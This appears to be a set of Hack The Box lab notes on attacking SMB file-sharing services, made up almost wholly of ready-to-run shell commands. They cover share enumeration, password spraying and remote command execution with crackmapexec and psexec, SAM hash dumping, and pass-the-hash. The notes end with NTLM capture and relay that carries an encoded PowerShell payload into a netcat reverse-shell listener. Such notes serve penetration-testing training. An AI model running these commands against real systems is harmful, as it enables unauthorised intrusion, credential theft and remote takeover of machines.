## Enumeration

```shell
3kjS@htb[/htb]$ sudo nmap 10.129.14.128 -sV -sC -p139,445
```
## Misconfigurations
#### File Share

```shell
3kjS@htb[/htb]$ smbclient -N -L //10.129.14.128
```

```shell
3kjS@htb[/htb]$ smbmap -H 10.129.14.128
```

Using `smbmap` with the `-r` or `-R` (recursive) option, one can browse the directories:

```shell
3kjS@htb[/htb]$ smbmap -H 10.129.14.128 -r notes
```

From the above example, the permissions are set to `READ` and `WRITE`, which one can use to upload and download the files.

```shell
3kjS@htb[/htb]$ smbmap -H 10.129.14.128 --download "notes\note.txt"
```

```shell
3kjS@htb[/htb]$ smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"
```
#### Remote Procedure Call (RPC)

```shell
3kjS@htb[/htb]$ rpcclient -U'%' 10.10.110.17
```

```shell
3kjS@htb[/htb]$ ./enum4linux-ng.py 10.10.11.45 -A -C
```
## Protocol Specifics Attacks
#### Brute Forcing and Password Spray

```shell
3kjS@htb[/htb]$ crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!' --local-auth
```
#### Impacket PsExec

```shell
3kjS@htb[/htb]$ impacket-psexec -h
```

```shell
3kjS@htb[/htb]$ impacket-psexec administrator:'Password123!'@10.10.110.17
```
#### CrackMapExec

```shell
3kjS@htb[/htb]$ crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec
```
#### Enumerating Logged-on Users

```shell
3kjS@htb[/htb]$ crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users
```
#### Extract Hashes from SAM Database

```shell
3kjS@htb[/htb]$ crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam
```
#### Pass-the-Hash (PtH)

```shell
3kjS@htb[/htb]$ crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE
```
#### Forced Authentication Attacks

```shell
3kjS@htb[/htb]$ responder -I <interface name>
```

```shell
3kjS@htb[/htb]$ sudo responder -I ens33
```

```shell
3kjS@htb[/htb]$ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

```shell
3kjS@htb[/htb]$ cat /etc/responder/Responder.conf | grep 'SMB =' 

SMB = Off
```

```shell
3kjS@htb[/htb]$ impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146
```

```shell
3kjS@htb[/htb]$ impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAY' ...SNIP...
```

```shell
3kjS@htb[/htb]$ nc -lvnp 9001
```

